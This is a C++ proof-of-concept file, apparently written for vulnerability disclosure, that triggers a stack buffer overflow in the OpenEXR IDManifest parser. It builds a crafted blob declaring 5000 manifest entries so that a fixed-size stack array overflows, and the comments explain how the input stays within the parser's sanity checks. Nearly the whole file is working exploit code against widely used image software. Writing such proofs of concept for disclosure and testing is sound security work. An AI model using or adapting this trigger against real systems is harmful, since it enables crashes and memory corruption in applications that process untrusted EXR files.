// PoC for a stack-buffer-overflow write reachable through the public,
// non-explicit IDManifest(const char*, const char*) constructor.
//
// Builds a minimal, well-formed (per the on-disk IDManifest encoding)
// byte blob declaring a large number of ChannelGroupManifest entries,
// each with an empty channel/component list and a zero-size id table.
// Everything here is in-contract input for the public parser: no private
// symbols, no forced abort.

#include <ImfIDManifest.h>

#include <cstdint>
#include <cstring>
#include <vector>

static void appendU32LE (std::vector<unsigned char>& buf, uint32_t v)
{
    buf.push_back ((unsigned char) (v & 0xff));
    buf.push_back ((unsigned char) ((v >> 8) & 0xff));
    buf.push_back ((unsigned char) ((v >> 16) & 0xff));
    buf.push_back ((unsigned char) ((v >> 24) & 0xff));
}

static void appendByte (std::vector<unsigned char>& buf, unsigned char v)
{
    buf.push_back (v);
}

int main (void)
{
    // Chosen well above the per-entry tracking array's real capacity,
    // but far below the declared entry-count sanity limit.
    const uint32_t kManifestEntries = 5000;

    std::vector<unsigned char> buf;

    // version (must be 0)
    appendU32LE (buf, 0);

    // top-level string list: zero strings
    appendU32LE (buf, 0);

    // rle mapping-table range count: zero ranges
    appendU32LE (buf, 0);

    // number of ChannelGroupManifest entries
    appendU32LE (buf, kManifestEntries);

    for (uint32_t i = 0; i < kManifestEntries; ++i)
    {
        appendU32LE (buf, 0); // channels: zero strings
        appendU32LE (buf, 0); // components: zero strings
        appendByte (buf, 0);  // lifetime (LIFETIME_FRAME)
        appendU32LE (buf, 0); // hashScheme pascal-string length
        appendU32LE (buf, 0); // encodingScheme pascal-string length
        appendByte (buf, 0);  // storageScheme
        appendU32LE (buf, 0); // id table size: zero entries
    }

    // A little slack so the small fixed-size look-ahead checks inside the
    // parser never read past the end of the buffer itself.
    for (int i = 0; i < 16; ++i)
        appendByte (buf, 0);

    const char* data = reinterpret_cast<const char*> (buf.data ());
    const char* end  = data + buf.size ();

    // Public, non-explicit, IMF_EXPORT constructor; in-contract crafted
    // bytes, exactly as the class's own file-reading constructor would
    // hand it after decompressing an idManifest attribute's payload.
    OPENEXR_IMF_NAMESPACE::IDManifest manifest (data, end);

    return 0;
}
